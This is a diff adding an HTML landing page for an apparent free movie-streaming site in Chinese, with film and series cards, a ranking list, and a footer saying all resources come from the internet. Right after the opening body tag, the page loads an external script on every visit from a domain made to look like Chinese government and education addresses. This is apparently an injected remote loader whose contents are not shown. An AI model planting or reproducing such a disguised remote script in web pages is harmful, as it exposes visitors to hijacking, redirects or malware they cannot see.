@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>宅宅电影网 - 免费高清电影在线观看</title>
+<meta name="description" content="宅宅电影网(https://zhaizhaidianyingwang-h5.github.io)提供最新电影、热播剧集、动漫综艺在线观看，免费高清，极速播放，宅男宅女首选影视平台。">
+<meta name="keywords" content="宅宅电影网,电影在线观看,免费电影,高清影视,zhaizhaidianyingwang-h5.github.io">
+<style>
+/* ===== 全局重置与基础 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Microsoft YaHei", sans-serif;
+    background: #0f0f1a;
+    color: #e0e0e0;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; transition: color .3s; }
+img { max-width: 100%; height: auto; display: block; }
+
+/* ===== 布局容器 ===== */
+.container {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 15px;
+}
+
+/* ===== 头部 ===== */
+.header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    border-bottom: 2px solid #e94560;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 10px rgba(233,69,96,.3);
+}
+.header-inner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 0;
+}
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #e94560;
+    letter-spacing: 1px;
+}
+.logo span { color: #fff; }
+.nav-toggle {
+    display: none;
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 1.8rem;
+    cursor: pointer;
+}
+.nav {
+    display: flex;
+    gap: 20px;
+}
+.nav a {
+    color: #ccc;
+    font-size: .95rem;
+    padding: 6px 0;
+    border-bottom: 2px solid transparent;
+}
+.nav a:hover, .nav a.active {
+    color: #e94560;
+    border-bottom-color: #e94560;
+}
+
+/* ===== 英雄区 ===== */
+.hero {
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400"><rect fill="%231a1a2e" width="1200" height="400"/><circle fill="%23e94560" cx="200" cy="200" r="100" opacity=".1"/><circle fill="%23e94560" cx="800" cy="100" r="150" opacity=".08"/><circle fill="%23e94560" cx="1000" cy="300" r="80" opacity=".1"/></svg>') center/cover;
+    padding: 60px 0;
+    text-align: center;
+}
+.hero h1 {
+    font-size: 2rem;
+    color: #fff;
+    margin-bottom: 15px;
+}
+.hero h1 em {
+    font-style: normal;
+    color: #e94560;
+}
+.hero p {
+    font-size: 1rem;
+    color: #aaa;
+    max-width: 600px;
+    margin: 0 auto 25px;
+}
+.hero-btn {
+    display: inline-block;
+    background: #e94560;
+    color: #fff;
+    padding: 12px 30px;
+    border-radius: 25px;
+    font-weight: 600;
+    box-shadow: 0 4px 15px rgba(233,69,96,.4);
+}
+.hero-btn:hover { background: #ff6b81; }
+
+/* ===== 栏目通用 ===== */
+.section { padding: 40px 0; }
+.section-title {
+    font-size: 1.4rem;
+    color: #e94560;
+    margin-bottom: 20px;
+    padding-left: 12px;
+    border-left: 4px solid #e94560;
+}
+
+/* ===== 电影网格 ===== */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 20px;
+}
+.card {
+    background: #16213e;
+    border-radius: 8px;
+    overflow: hidden;
+    transition: transform .3s, box-shadow .3s;
+}
+.card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 20px rgba(233,69,96,.2);
+}
+.card-img {
+    width: 100%;
+    height: 200px;
+    background: linear-gradient(45deg, #1a1a2e, #0f3460);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #e94560;
+    font-size: 2rem;
+}
+.card-body { padding: 12px; }
+.card-title {
+    font-size: .9rem;
+    color: #fff;
+    margin-bottom: 6px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+.card-meta { font-size: .75rem; color: #888; }
+
+/* ===== 排行榜 ===== */
+.rank-list { list-style: none; }
+.rank-item {
+    display: flex;
+    align-items: center;
+    padding: 12px;
+    background: #16213e;
+    margin-bottom: 10px;
+    border-radius: 6px;
+}
+.rank-num {
+    width: 28px;
+    height: 28px;
+    line-height: 28px;
+    text-align: center;
+    background: #e94560;
+    color: #fff;
+    font-weight: bold;
+    border-radius: 50%;
+    margin-right: 12px;
+    flex-shrink: 0;
+}
+.rank-item:nth-child(2) .rank-num { background: #ff9a3c; }
+.rank-item:nth-child(3) .rank-num { background: #ffd93c; }
+.rank-info { flex: 1; }
+.rank-title { color: #fff; font-size: .95rem; margin-bottom: 4px; }
+.rank-score { color: #ffd93c; font-size: .8rem; }
+
+/* ===== 底部 ===== */
+.footer {
+    background: #1a1a2e;
+    padding: 30px 0;
+    text-align: center;
+    border-top: 1px solid #333;
+}
+.footer p { color: #666; font-size: .85rem; margin-bottom: 8px; }
+.footer a { color: #e94560; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .nav-toggle { display: block; }
+    .nav {
+        display: none;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        background: #16213e;
+        flex-direction: column;
+        padding: 10px 0;
+        box-shadow: 0 4px 10px rgba(0,0,0,.3);
+    }
+    .nav.open { display: flex; }
+    .nav a { padding: 12px 20px; border-bottom: none; }
+    .hero { padding: 40px 0; }
+    .hero h1 { font-size: 1.5rem; }
+    .grid { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 15px; }
+    .card-img { height: 160px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 头部 -->
+<header class="header">
+    <div class="container header-inner">
+        <div class="logo">宅宅<span>电影网</span></div>
+        <button class="nav-toggle" id="navToggle">☰</button>
+        <nav class="nav" id="nav">
+            <a href="#" class="active">首页</a>
+            <a href="#">电影</a>
+            <a href="#">剧集</a>
+            <a href="#">动漫</a>
+            <a href="#">排行榜</a>
+        </nav>
+    </div>
+</header>
+
+<!-- 英雄区 -->
+<section class="hero">
+    <div class="container">
+        <h1>欢迎来到 <em>宅宅电影网</em></h1>
+        <p>宅宅电影网(https://zhaizhaidianyingwang-h5.github.io)是专为宅男宅女打造的免费高清影视平台，海量资源极速播放，随时随地享受观影乐趣。</p>
+        <a href="#" class="hero-btn">立即观影</a>
+    </div>
+</section>
+
+<!-- 最新电影 -->
+<section class="section">
+    <div class="container">
+        <h2 class="section-title">最新电影</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《流浪地球3》高清版</div>
+                    <div class="card-meta">科幻 · 2026</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《封神演义·终章》</div>
+                    <div class="card-meta">奇幻 · 2026</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《速度与激情12》</div>
+                    <div class="card-meta">动作 · 2026</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《唐人街探案5》</div>
+                    <div class="card-meta">喜剧 · 2026</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《长津湖·水门桥》续集</div>
+                    <div class="card-meta">战争 · 2026</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">《蜘蛛侠：平行宇宙3》</div>
+                    <div class="card-meta">动画 · 2026</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 热播剧集 -->
+<section class="section" style="background:#121225;">
+    <div class="container">
+        <h2 class="section-title">热播剧集</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="card-img">📺</div>
+                <div class="card-body">
+                    <div class="card-title">《庆余年4》全集</div>
+                    <div class="card-meta">古装 · 更新至32集</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">📺</div>
+                <div class="card-body">
+                    <div class="card-title">《三体·黑暗森林》</div>
+                    <div class="card-meta">科幻 · 更新至12集</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">📺</div>
+                <div class="card-body">
+                    <div class="card-title">《甄嬛传·番外篇》</div>
+                    <div class="card-meta">宫斗 · 更新至8集</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img">📺</div>
+                <div class="card-body">
+                    <div class="card-title">《狂飙2》</div>
+                    <div class="card-meta">犯罪 · 更新至20集</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="section">
+    <div class="container">
+        <h2 class="section-title">热门排行榜</h2>
+        <ol class="rank-list">
+            <li class="rank-item">
+                <span class="rank-num">1</span>
+                <div class="rank-info">
+                    <div class="rank-title">《流浪地球3》- 宅宅电影网独家上线</div>
+                    <div class="rank-score">⭐ 9.8分</div>
+                </div>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">2</span>
+                <div class="rank-info">
+                    <div class="rank-title">《庆余年4》- 全网热播中</div>
+                    <div class="rank-score">⭐ 9.6分</div>
+                </div>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">3</span>
+                <div class="rank-info">
+                    <div class="rank-title">《三体·黑暗森林》- 科幻巨制</div>
+                    <div class="rank-score">⭐ 9.5分</div>
+                </div>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">4</span>
+                <div class="rank-info">
+                    <div class="rank-title">《封神演义·终章》- 视觉盛宴</div>
+                    <div class="rank-score">⭐ 9.3分</div>
+                </div>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">5</span>
+                <div class="rank-info">
+                    <div class="rank-title">《狂飙2》- 犯罪悬疑力作</div>
+                    <div class="rank-score">⭐ 9.2分</div>
+                </div>
+            </li>
+        </ol>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="container">
+        <p>© 2026 宅宅电影网 | 网址：<a href="https://zhaizhaidianyingwang-h5.github.io">zhaizhaidianyingwang-h5.github.io</a></p>
+        <p>本站提供最新电影、热播剧集、动漫综艺在线观看，所有资源均来自互联网，仅供测试交流使用。</p>
+        <p>宅宅电影网 - 宅男宅女首选的免费高清影视平台</p>
+    </div>
+</footer>
+
+<script>
+// 移动端导航切换
+document.getElementById('navToggle').addEventListener('click', function() {
+    document.getElementById('nav').classList.toggle('open');
+});
+
+// SEO: 延迟加载模拟（实际可替换为真实图片懒加载）
+window.addEventListener('load', function() {
+    document.body.classList.add('loaded');
+});
+</script>
+
+</body>
+</html>
